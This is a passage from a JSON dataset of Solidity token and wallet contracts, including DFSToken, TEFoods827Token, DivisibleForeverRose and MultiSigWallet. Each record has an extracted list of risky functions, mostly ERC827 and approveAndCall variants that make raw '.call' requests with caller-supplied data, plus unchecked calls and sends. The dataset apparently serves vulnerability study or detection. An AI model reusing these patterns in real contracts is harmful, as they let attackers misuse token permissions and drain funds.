require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract DFSToken is MintableToken, ERC827Token, NoOwner {\n string public symbol = 'DFS';\n string public name = 'Digital Fantasy Sports';\n uint8 public constant decimals = 18;\n bool public transferEnabled;\n function setTransferEnabled(bool enable) onlyOwner public {\n transferEnabled = enable;\n }\n modifier canTransfer() {\n require( transferEnabled || msg.sender == owner);\n _;\n }\n function transfer(address _to, uint256 _value) canTransfer public returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) canTransfer public returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value, bytes _data) canTransfer public returns (bool) {\n return super.transfer(_to, _value, _data);\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) canTransfer public returns (bool) {\n return super.transferFrom(_from, _to, _value, _data);\n }\n}",
  "extract_feature": [
    "function reclaimEther() external onlyOwner {\nassert(owner.send(this.balance));\n}",
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.increaseApproval(_spender, _addedValue);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.decreaseApproval(_spender, _subtractedValue);\nrequire(_spender.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb145a"
  },
  "filename": "24997.sol",
  "content": "pragma solidity ^0.4.18;\ncontract ERC721 {\n function totalSupply() public view returns (uint256 total);\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _tokenId) external;\n event Transfer(address from, address to, uint256 tokenId);\n}\ncontract DivisibleForeverRose is ERC721 {\n address private contractOwner;\n mapping(uint => GiftToken) giftStorage;\n uint public totalSupply = 10;\n bool public tradable = false;\n uint foreverRoseId = 1;\n mapping(address => mapping(uint => uint)) ownerToTokenShare;\n mapping(uint => mapping(address => uint)) tokenToOwnersHoldings;\n mapping(uint => bool) foreverRoseCreated;\n string public name;\n string public symbol;\n uint8 public decimals = 1;\n string public version = \"1.0\";\n struct GiftToken {\n uint256 giftId;\n }\n function DivisibleForeverRose() public {\n contractOwner = msg.sender;\n name = \"ForeverRose\";\n symbol = \"ROSE\";\n GiftToken memory newGift = GiftToken({\n giftId: foreverRoseId\n });\n giftStorage[foreverRoseId] = newGift;\n foreverRoseCreated[foreverRoseId] = true;\n _addNewOwnerHoldingsToToken(contractOwner, foreverRoseId, totalSupply);\n _addShareToNewOwner(contractOwner, foreverRoseId, totalSupply);\n }\n function() public {\n revert();\n }\n function totalSupply() public view returns (uint256 total) {\n return totalSupply;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return ownerToTokenShare[_owner][foreverRoseId];\n }\n function transfer(address _to, uint256 _tokenId) external {\n require(tradable == true);\n require(_to != address(0));\n require(msg.sender != _to);\n uint256 _divisibility = _tokenId;\n require(tokenToOwnersHoldings[foreverRoseId][msg.sender] >= _divisibility);\n _removeShareFromLastOwner(msg.sender, foreverRoseId, _divisibility);\n _removeLastOwnerHoldingsFromToken(msg.sender, foreverRoseId, _divisibility);\n _addNewOwnerHoldingsToToken(_to, foreverRoseId, _divisibility);\n _addShareToNewOwner(_to, foreverRoseId, _divisibility);\n Transfer(msg.sender, _to, foreverRoseId);\n }\n function assignSharedOwnership(address _to, uint256 _divisibility)\n onlyOwner external returns (bool success)\n {\n require(_to != address(0));\n require(msg.sender != _to);\n require(_to != address(this));\n require(tokenToOwnersHoldings[foreverRoseId][msg.sender] >= _divisibility);\n _removeLastOwnerHoldingsFromToken(msg.sender, foreverRoseId, _divisibility);\n _removeShareFromLastOwner(msg.sender, foreverRoseId, _divisibility);\n _addShareToNewOwner(_to, foreverRoseId, _divisibility);\n _addNewOwnerHoldingsToToken(_to, foreverRoseId, _divisibility);\n Transfer(msg.sender, _to, foreverRoseId);\n return true;\n }\n function getForeverRose() public view returns(uint256 _foreverRoseId) {\n return giftStorage[foreverRoseId].giftId;\n }\n function turnOnTradable() public onlyOwner {\n tradable = true;\n }\n function _addShareToNewOwner(address _owner, uint _tokenId, uint _units) internal {\n ownerToTokenShare[_owner][_tokenId] += _units;\n }\n function _addNewOwnerHoldingsToToken(address _owner, uint _tokenId, uint _units) internal {\n tokenToOwnersHoldings[_tokenId][_owner] += _units;\n }\n function _removeShareFromLastOwner(address _owner, uint _tokenId, uint _units) internal {\n ownerToTokenShare[_owner][_tokenId] -= _units;\n }\n function _removeLastOwnerHoldingsFromToken(address _owner, uint _tokenId, uint _units) internal {\n tokenToOwnersHoldings[_tokenId][_owner] -= _units;\n }\n function withdrawEther() onlyOwner public returns(bool) {\n return contractOwner.send(this.balance);\n }\n modifier onlyExistentToken(uint _tokenId) {\n require(foreverRoseCreated[_tokenId] == true);\n _;\n }\n modifier onlyOwner(){\n require(msg.sender == contractOwner);\n _;\n }\n}\ncontract MultiSigWallet {\n uint constant public MAX_OWNER_COUNT = 50;\n event Confirmation(address indexed sender, uint indexed transactionId);\n event Revocation(address indexed sender, uint indexed transactionId);\n event Submission(uint indexed transactionId);\n event Execution(uint indexed transactionId);\n event ExecutionFailure(uint indexed transactionId);\n event Deposit(address indexed sender, uint value);\n event OwnerAddition(address indexed owner);\n event OwnerRemoval(address indexed owner);\n event RequirementChange(uint required);\n event CoinCreation(address coin);\n mapping (uint => Transaction) public transactions;\n mapping (uint => mapping (address => bool)) public confirmations;\n mapping (address => bool) public isOwner;\n address[] public owners;\n uint public required;\n uint public transactionCount;\n bool flag = true;\n struct Transaction {\n address destination;\n uint value;\n bytes data;\n bool executed;\n }\n modifier onlyWallet() {\n if (msg.sender != address(this))\n revert();\n _;\n }\n modifier ownerDoesNotExist(address owner) {\n if (isOwner[owner])\n revert();\n _;\n }\n modifier ownerExists(address owner) {\n if (!isOwner[owner])\n revert();\n _;\n }\n modifier transactionExists(uint transactionId) {\n if (transactions[transactionId].destination == 0)\n revert();\n _;\n }\n modifier confirmed(uint transactionId, address owner) {\n if (!confirmations[transactionId][owner])\n revert();\n _;\n }\n modifier notConfirmed(uint transactionId, address owner) {\n if (confirmations[transactionId][owner])\n revert();\n _;\n }\n modifier notExecuted(uint transactionId) {\n if (transactions[transactionId].executed)\n revert();\n _;\n }\n modifier notNull(address _address) {\n if (_address == 0)\n revert();\n _;\n }\n modifier validRequirement(uint ownerCount, uint _required) {\n if ( ownerCount > MAX_OWNER_COUNT\n || _required > ownerCount\n || _required == 0\n || ownerCount == 0)\n revert();\n _;\n }\n function()\n payable\n {\n if (msg.value > 0)\n Deposit(msg.sender, msg.value);\n }\n function MultiSigWallet(address[] _owners, uint _required)\n public\n validRequirement(_owners.length, _required)\n {\n for (uint i=0; i<_owners.length; i++) {\n if (isOwner[_owners[i]] || _owners[i] == 0)\n revert();\n isOwner[_owners[i]] = true;\n }\n owners = _owners;\n required = _required;\n }\n function addOwner(address owner)\n public\n onlyWallet\n ownerDoesNotExist(owner)\n notNull(owner)\n validRequirement(owners.length + 1, required)\n {\n isOwner[owner] = true;\n owners.push(owner);\n OwnerAddition(owner);\n }\n function removeOwner(address owner)\n public\n onlyWallet\n ownerExists(owner)\n {\n isOwner[owner] = false;\n for (uint i=0; i<owners.length - 1; i++)\n if (owners[i] == owner) {\n owners[i] = owners[owners.length - 1];\n break;\n }\n owners.length -= 1;\n if (required > owners.length)\n changeRequirement(owners.length);\n OwnerRemoval(owner);\n }\n function replaceOwner(address owner, address newOwner)\n public\n onlyWallet\n ownerExists(owner)\n ownerDoesNotExist(newOwner)\n {\n for (uint i=0; i<owners.length; i++)\n if (owners[i] == owner) {\n owners[i] = newOwner;\n break;\n }\n isOwner[owner] = false;\n isOwner[newOwner] = true;\n OwnerRemoval(owner);\n OwnerAddition(newOwner);\n }\n function changeRequirement(uint _required)\n public\n onlyWallet\n validRequirement(owners.length, _required)\n {\n required = _required;\n RequirementChange(_required);\n }\n function submitTransaction(address destination, uint value, bytes data)\n public\n returns (uint transactionId)\n {\n transactionId = addTransaction(destination, value, data);\n confirmTransaction(transactionId);\n }\n function confirmTransaction(uint transactionId)\n public\n ownerExists(msg.sender)\n transactionExists(transactionId)\n notConfirmed(transactionId, msg.sender)\n {\n confirmations[transactionId][msg.sender] = true;\n Confirmation(msg.sender, transactionId);\n executeTransaction(transactionId);\n }\n function revokeConfirmation(uint transactionId)\n public\n ownerExists(msg.sender)\n confirmed(transactionId, msg.sender)\n notExecuted(transactionId)\n {\n confirmations[transactionId][msg.sender] = false;\n Revocation(msg.sender, transactionId);\n }\n function executeTransaction(uint transactionId)\n public\n notExecuted(transactionId)\n {\n if (isConfirmed(transactionId)) {\n Transaction tx = transactions[transactionId];\n tx.executed = true;\n if (tx.destination.call.value(tx.value)(tx.data))\n Execution(transactionId);\n else {\n ExecutionFailure(transactionId);\n tx.executed = false;\n }\n }\n }\n function isConfirmed(uint transactionId)\n public\n constant\n returns (bool)\n {\n uint count = 0;\n for (uint i=0; i<owners.length; i++) {\n if (confirmations[transactionId][owners[i]])\n count += 1;\n if (count == required)\n return true;\n }\n }\n function addTransaction(address destination, uint value, bytes data)\n internal\n notNull(destination)\n returns (uint transactionId)\n {\n transactionId = transactionCount;\n transactions[transactionId] = Transaction({\n destination: destination,\n value: value,\n data: data,\n executed: false\n });\n transactionCount += 1;\n Submission(transactionId);\n }\n function getConfirmationCount(uint transactionId)\n public\n constant\n returns (uint count)\n {\n for (uint i=0; i<owners.length; i++)\n if (confirmations[transactionId][owners[i]])\n count += 1;\n }\n function getTransactionCount(bool pending, bool executed)\n public\n constant\n returns (uint count)\n {\n for (uint i=0; i<transactionCount; i++)\n if ( pending && !transactions[i].executed\n || executed && transactions[i].executed)\n count += 1;\n }\n function getOwners()\n public\n constant\n returns (address[])\n {\n return owners;\n }\n function getConfirmations(uint transactionId)\n public\n constant\n returns (address[] _confirmations)\n {\n address[] memory confirmationsTemp = new address[](owners.length);\n uint count = 0;\n uint i;\n for (i=0; i<owners.length; i++)\n if (confirmations[transactionId][owners[i]]) {\n confirmationsTemp[count] = owners[i];\n count += 1;\n }\n _confirmations = new address[](count);\n for (i=0; i<count; i++)\n _confirmations[i] = confirmationsTemp[i];\n }\n function getTransactionIds(uint from, uint to, bool pending, bool executed)\n public\n constant\n returns (uint[] _transactionIds)\n {\n uint[] memory transactionIdsTemp = new uint[](transactionCount);\n uint count = 0;\n uint i;\n for (i=0; i<transactionCount; i++)\n if ( pending && !transactions[i].executed\n || executed && transactions[i].executed)\n {\n transactionIdsTemp[count] = i;\n count += 1;\n }\n _transactionIds = new uint[](to - from);\n for (i=from; i<to; i++)\n _transactionIds[i - from] = transactionIdsTemp[i];\n }\n modifier onlyOwner() {\n require(isOwner[msg.sender] == true);\n _;\n }\n function createForeverRose()\n external\n onlyWallet\n {\n require(flag == true);\n CoinCreation(new DivisibleForeverRose());\n flag = false;\n }\n}",
  "extract_feature": [
    "function withdrawEther() onlyOwner public returns(bool) {\nreturn contractOwner.send(this.balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb145b"
  },
  "filename": "24999.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract ERC827 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract TEFoodsToken is Ownable, ERC20Interface {\n using SafeMath for uint;\n string public constant name = \"TEFOOD FARM TO FORK FOOD TRACEABILITY SYSTEM LICENSE TOKEN\";\n string public constant symbol = \"TFOOD\";\n uint8 public constant decimals = 18;\n uint constant _totalSupply = 1000000000 * 1 ether;\n uint public transferrableTime = 1521712800;\n uint _vestedSupply;\n uint _circulatingSupply;\n mapping (address => uint) balances;\n mapping (address => mapping(address => uint)) allowed;\n struct vestedBalance {\n address addr;\n uint balance;\n }\n mapping (uint => vestedBalance[]) vestingMap;\n function TEFoodsToken () public {\n owner = msg.sender;\n balances[0x00] = _totalSupply;\n }\n event VestedTokensReleased(address to, uint amount);\n function allocateTokens (address addr, uint amount) public onlyOwner returns (bool) {\n require (addr != 0x00);\n require (amount > 0);\n balances[0x00] = balances[0x00].sub(amount);\n balances[addr] = balances[addr].add(amount);\n _circulatingSupply = _circulatingSupply.add(amount);\n assert (_vestedSupply.add(_circulatingSupply).add(balances[0x00]) == _totalSupply);\n return true;\n }\n function allocateVestedTokens (address addr, uint amount, uint vestingPeriod) public onlyOwner returns (bool) {\n require (addr != 0x00);\n require (amount > 0);\n require (vestingPeriod > 0);\n balances[0x00] = balances[0x00].sub(amount);\n vestingMap[vestingPeriod].push( vestedBalance (addr,amount) );\n _vestedSupply = _vestedSupply.add(amount);\n assert (_vestedSupply.add(_circulatingSupply).add(balances[0x00]) == _totalSupply);\n return true;\n }\n function releaseVestedTokens (uint vestingPeriod) public {\n require (now >= transferrableTime.add(vestingPeriod));\n require (vestingMap[vestingPeriod].length > 0);\n require (vestingMap[vestingPeriod][0].balance > 0);\n var v = vestingMap[vestingPeriod];\n for (uint8 i = 0; i < v.length; i++) {\n balances[v[i].addr] = balances[v[i].addr].add(v[i].balance);\n _circulatingSupply = _circulatingSupply.add(v[i].balance);\n _vestedSupply = _vestedSupply.sub(v[i].balance);\n v[i].balance = 0;\n VestedTokensReleased(v[i].addr, v[i].balance);\n }\n }\n function enableTransfers () public onlyOwner returns (bool) {\n if (now.add(86400) < transferrableTime) {\n transferrableTime = now.add(86400);\n }\n owner = 0x00;\n return true;\n }\n function () public payable {\n revert();\n }\n function totalSupply() public constant returns (uint) {\n return _circulatingSupply;\n }\n function balanceOf(address tokenOwner) public constant returns (uint balance) {\n return balances[tokenOwner];\n }\n function vestedBalanceOf(address tokenOwner, uint vestingPeriod) public constant returns (uint balance) {\n var v = vestingMap[vestingPeriod];\n for (uint8 i = 0; i < v.length; i++) {\n if (v[i].addr == tokenOwner) return v[i].balance;\n }\n return 0;\n }\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n function transfer(address to, uint tokens) public returns (bool success) {\n require (now >= transferrableTime);\n require (to != address(this));\n require (balances[msg.sender] >= tokens);\n balances[msg.sender] = balances[msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n Transfer(msg.sender, to, tokens);\n return true;\n }\n function approve(address spender, uint tokens) public returns (bool success) {\n require (spender != address(this));\n allowed[msg.sender][spender] = tokens;\n Approval(msg.sender, spender, tokens);\n return true;\n }\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n require (now >= transferrableTime);\n require (to != address(this));\n require (allowed[from][msg.sender] >= tokens);\n balances[from] = balances[from].sub(tokens);\n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n Transfer(from, to, tokens);\n return true;\n }\n}\ncontract TEFoods827Token is TEFoodsToken, ERC827 {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n}",
  "extract_feature": [
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb145c"
  },
  "filename": "252.sol",
  "content": "pragma solidity ^0.4.20;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 250000000000;\n totalSupply = 250000000000;\n name = \"CRYPT EXCHANGE TOKEN\";\n decimals = 0;\n symbol = \"CRTX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb145d"
  },
  "filename": "254.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ChooChooCoin is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function ChooChooCoin() {\n balances[msg.sender] = 500000000000000000000000000;\n totalSupply = 500000000000000000000000000;\n name = \"Choo Choo Coin\";\n decimals = 18;\n symbol = \"Choo\";\n unitsOneEthCanBuy = 5800;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n emit Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb145e"
  },
  "filename": "261.sol",
  "content": "pragma solidity ^0.4.18;\ncontract EBU{\n address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;\n address public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;\n function transfer(address[] _tos,uint[] v)public returns (bool){\n require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);\n require(_tos.length > 0);\n bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n for(uint i=0;i<_tos.length;i++){\n caddress.call(id,from,_tos[i],v[i]*1000000000000000000);\n }\n return true;\n }\n}",
  "extract_feature": [
    "function transfer(address[] _tos,uint[] v)public returns (bool){\nrequire(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v[i]*1000000000000000000);\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb145f"
  },
  "filename": "289.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Glv is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function Glv(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1460"
  },
  "filename": "31356.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Authorizable is Ownable {\n mapping(address => bool) public authorized;\n event AuthorizationSet(address indexed addressAuthorized, bool indexed authorization);\n function Authorizable() public {\n authorized[msg.sender] = true;\n }\n modifier onlyAuthorized() {\n require(authorized[msg.sender]);\n _;\n }\n function setAuthorized(address addressAuthorized, bool authorization) onlyOwner public {\n AuthorizationSet(addressAuthorized, authorization);\n authorized[addressAuthorized] = authorization;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => 